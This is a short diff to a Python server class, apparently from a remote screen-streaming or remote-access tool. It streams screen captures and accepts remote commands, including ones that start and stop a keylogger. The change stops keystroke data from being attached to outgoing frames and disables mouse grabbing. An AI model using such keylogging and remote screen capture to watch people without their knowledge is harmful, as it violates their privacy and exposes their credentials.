@@ -39,6 +39,8 @@ class Server():
             **options
         )
 
+        self.server.inpListener.grabMouseInput = False
+
         self.stream = ScreenGear(backend="mss",
                             monitor=1,
                             #colorspace="COLOR_BGR2RGB",
@@ -54,12 +56,11 @@ class Server():
 
 
     def __start(self):
-        self.additional_data = lambda: None
         while self.__running:
             frame = self.stream.read()
             frame = flip(frame[:, :, :3], 2)
             frame = cv2.resize(frame, (self.resolutionWidth, self.resolutionHeight), interpolation=cv2.INTER_LANCZOS4)
-            return_data = self.server.send(frame, self.additional_data())
+            return_data = self.server.send(frame, None)
             if return_data:
                 status_code, data = return_data
                 if status_code:
@@ -94,11 +95,9 @@ class Server():
 
                         elif cmd == "Start KeyLogger":
                             self.server.inpListener.grabKeyInput = True
-                            self.additional_data = self.server.inpListener.fetch
 
                         elif cmd == "Stop KeyLogger":
                             self.server.inpListener.grabKeyInput = False
-                            self.additional_data = lambda: None
 
                         elif cmd == "Width Change":
                             self.resolutionWidth = args[0]
